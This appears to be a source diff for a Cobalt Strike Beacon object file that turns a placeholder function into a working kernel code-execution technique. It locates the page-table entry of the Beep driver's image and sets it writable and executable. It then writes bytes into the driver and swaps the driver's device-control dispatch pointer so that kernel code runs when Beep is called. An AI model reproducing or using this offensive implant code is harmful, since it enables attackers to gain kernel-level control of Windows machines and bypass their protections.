@@ -22,10 +22,17 @@
  *
 **/
 
-D_SEC( B ) VOID WINAPI DsePatchPte( _In_ PBEACON_API BeaconApi, _In_ PAPI Api ) 
+D_SEC( B ) VOID WINAPI PteExecuteKernelPayload( _In_ PBEACON_API BeaconApi, _In_ PAPI Api, _In_ PVOID Buffer, _In_ ULONG Length )
 {
+	HANDLE				Dev = NULL;
+	PVOID				Img = NULL;
+	ULONG_PTR			Bit = 0;
+
+	PVOID				Ctr = NULL;
+	PVOID				Obj = NULL;
 	PVOID				Pte = NULL;
-	PBYTE				Adr = NULL;
+	PVOID				Tgt = NULL;
+	PVOID				Ptb = NULL;
 	PBYTE				Ptr = NULL;
 	PVOID				Map = NULL;
 	PCHAR				Str = NULL;
@@ -33,12 +40,24 @@ D_SEC( B ) VOID WINAPI DsePatchPte( _In_ PBEACON_API BeaconApi, _In_ PAPI Api )
 	PSYSTEM_MODULE_INFORMATION 	Inf = NULL;
 
 	hde64s				Hde;
+	
+	FILE_OBJECT			Flo;
+	DEVICE_OBJECT			Dvo;
+	DRIVER_OBJECT			Drv;
+
+	UNICODE_STRING			Uni;
+	IO_STATUS_BLOCK			Ios;
+	OBJECT_ATTRIBUTES		Att;
 	RTL_OSVERSIONINFOW		Ver;
 
 	RtlSecureZeroMemory( &Hde, sizeof( Hde ) );
+	RtlSecureZeroMemory( &Flo, sizeof( Flo ) );
+	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );
+	RtlSecureZeroMemory( &Ios, sizeof( Ios ) );
+	RtlSecureZeroMemory( &Att, sizeof( Att ) );
 	RtlSecureZeroMemory( &Ver, sizeof( Ver ) );
-	Ver.dwOSVersionInfoSize = sizeof( Ver );
 
+	Ver.dwOSVersionInfoSize = sizeof( Ver );
 	Api->RtlGetVersion( &Ver );
 
 	/* Get size! */
@@ -63,9 +82,16 @@ D_SEC( B ) VOID WINAPI DsePatchPte( _In_ PBEACON_API BeaconApi, _In_ PAPI Api )
 	for ( ULONG Idx = 0 ; Idx < Inf->Count ; ++Idx ) {
 		Str = C_PTR( U_PTR( Inf->Module[ Idx ].FullPathName ) + Inf->Module[ Idx ].OffsetToFileName );
 
-		/* Is CI.DLL? */
+		if ( HashString( Str, 0 ) == H_STR_BEEP ) {
+			Tgt = Inf->Module[ Idx ].ImageBase;
+		};
+		/* Is NTOSKRNL.EXE? */
 		if ( HashString( Str, 0 ) == H_STR_NTOSKRNL ) {
+			Img = Inf->Module[ Idx ].ImageBase;
+		};
 
+		if ( ( Tgt != NULL ) && ( Img != NULL ) ) 
+		{
 			Map = Api->LoadLibraryEx( C_PTR( G_SYM( "C:\\Windows\\System32\\ntoskrnl.exe" ) ), NULL, DONT_RESOLVE_DLL_REFERENCES );
 
 			if ( Map != NULL )
@@ -96,29 +122,103 @@ D_SEC( B ) VOID WINAPI DsePatchPte( _In_ PBEACON_API BeaconApi, _In_ PAPI Api )
 						} while ( Off < 256 );
 
 						Ptr = C_PTR( U_PTR( Ptr ) + Off + 5 + Rel );
-						Ptr = C_PTR( U_PTR( Inf->Module[ Idx ].ImageBase ) + ( U_PTR( Ptr ) - U_PTR( Map ) ) );
+						Ptr = C_PTR( U_PTR( Img ) + ( U_PTR( Ptr ) - U_PTR( Map ) ) );
 						Ptr = C_PTR( U_PTR( Ptr ) - 0x100000000 );
 
-						if ( !( Api->NtReadVirtualMemory( ( ( HANDLE ) - 1 ), C_PTR( U_PTR( Ptr ) + 0x13 ), &Pte, sizeof( Pte ), NULL ) >= 0 ) ) {
+						if ( !( Api->NtReadVirtualMemory( ( ( HANDLE ) - 1 ), C_PTR( U_PTR( Ptr ) + 0x13 ), &Ptb, sizeof( Ptb ), NULL ) >= 0 ) ) {
 							BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not read pte base." ) ) );
 							goto Leave;
 						};
 					};
 				} else {
 					/* Static before RS1 */
-					Pte = C_PTR( 0xFFFFF68000000000 );
+					Ptb = C_PTR( 0xFFFFF68000000000 );
 				};
 
-				if ( Pte != NULL ) {
-					/* Allocate RWX Page! */
-					/* Remove U/S BIT! */
-					/* Execute! */
-					/* Restore! */
+				if ( Ptb != NULL ) 
+				{
+					Pte = C_PTR( U_PTR( U_PTR( Tgt ) >> 9 ) );
+					Pte = C_PTR( U_PTR( U_PTR( Pte ) & 0x7ffffffff8 ) );
+					Pte = C_PTR( U_PTR( U_PTR( Pte ) + U_PTR( Ptb ) ) );
+
+					if ( ! Api->NtReadVirtualMemory( ( ( HANDLE ) - 1 ), Pte, &Bit, sizeof( Bit ), NULL ) ) 
+					{	
+						/**
+						 *
+						 * https://git.alnyan.me/yggdrasil/kernel/commit/cbb39f9d772f235a2eaf70f8525e5f4fcf7fca59.patch
+						 *
+						 * Inserts a MM_PAGE_WRITE & removes MM_PAGE_NOEXECUTE.
+						 *
+						 * Allowing us to read and write to the memory, as well
+						 * as execute kernel code.
+						 *
+						**/
+
+						Bit = U_PTR( U_PTR( U_PTR( Bit ) & 0x0FFFFFFFFFFFFFFF ) );
+						Bit = U_PTR( U_PTR( U_PTR( Bit ) | ( 1 << 1 ) ) );
+						
+						if ( ! Api->NtWriteVirtualMemory( ( ( HANDLE ) - 1 ), Pte, &Bit, sizeof( PVOID ), NULL ) ) 
+						{
+							if ( !( Api->NtWriteVirtualMemory( ( ( HANDLE ) - 1 ), Tgt, &( UCHAR ){ 0xC3 }, sizeof( UCHAR ), NULL ) >= 0 ) ) {
+								BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not write kernel shellcode to header. vbs enabled?" ) ) );
+								goto Leave;
+							};
+
+							RtlSecureZeroMemory( &Uni, sizeof( Uni ) );
+							RtlSecureZeroMemory( &Att, sizeof( Att ) );
+							RtlSecureZeroMemory( &Ios, sizeof( Ios ) );
+
+							Api->RtlInitUnicodeString( &Uni, C_PTR( G_SYM( L"\\Device\\Beep" ) ) );
+							InitializeObjectAttributes( &Att, &Uni, 0x40, NULL, NULL );
+
+							if ( !( Api->NtOpenFile( &Dev, FILE_READ_DATA, &Att, &Ios, FILE_SHARE_READ, OPEN_EXISTING ) >= 0 ) ) {
+								BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not open beep device." ) ) );
+								goto Leave;
+							};
+							if ( !( Obj = ObjFromHandle( BeaconApi, Api, Dev ) ) ) {
+								BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not get object address." ) ) );
+								goto Leave;
+							};
+							if ( !( Api->NtReadVirtualMemory( ( ( HANDLE ) - 1 ), Obj, &Flo, sizeof( Flo ), NULL ) >= 0 ) ) {
+								BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not read file object." ) ) );
+								goto Leave;
+							};
+							if ( !( Api->NtReadVirtualMemory( ( ( HANDLE ) - 1 ), Flo.DeviceObject, &Dvo, sizeof( Dvo ), NULL ) >= 0 ) ) {
+								BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not read device object." ) ) );
+								goto Leave;
+							};
+							if ( !( Api->NtReadVirtualMemory( ( ( HANDLE ) - 1 ), Dvo.DriverObject, &Drv, sizeof( Drv ), NULL ) >= 0 ) ) {
+								BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not read driver object." ) ) );
+								goto Leave;
+							};
+
+							Ctr = C_PTR( Drv.MajorFunction[ 0x0e ] );
+							Drv.MajorFunction[ 0x0e ] = C_PTR( Tgt );
+
+							if ( !( Api->NtWriteVirtualMemory( ( ( HANDLE ) - 1 ), Dvo.DriverObject, &Drv, sizeof( Drv ), NULL ) >= 0 ) ) {
+								BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not write driver object." ) ) );
+								goto Leave;
+							};
+							
+							/* Shellcode! */
+							Api->Beep( 37, 1 );
+						} else {
+							BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not read gs base." ) ) );
+						};
+						/* Set IRP_MJ_DEVICE_IO_CONTROL! */
+					} else {
+						BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not read pte control bit." ) ) );
+						goto Leave;
+					};
+				} else {
+					BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not read pte base." ) ) );
+					goto Leave;
 				};
 			} else {
 				BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not load ntoskrnl.exe" ) ) );
 				goto Leave;
 			};
+			break;
 		};
 	};
 Leave:
@@ -127,5 +227,8 @@ Leave:
 	};
 	if ( Map != NULL ) {
 		Api->FreeLibrary( Map );
+	};
+	if ( Dev != NULL ) {
+		Api->NtClose( Dev );
 	};
 };
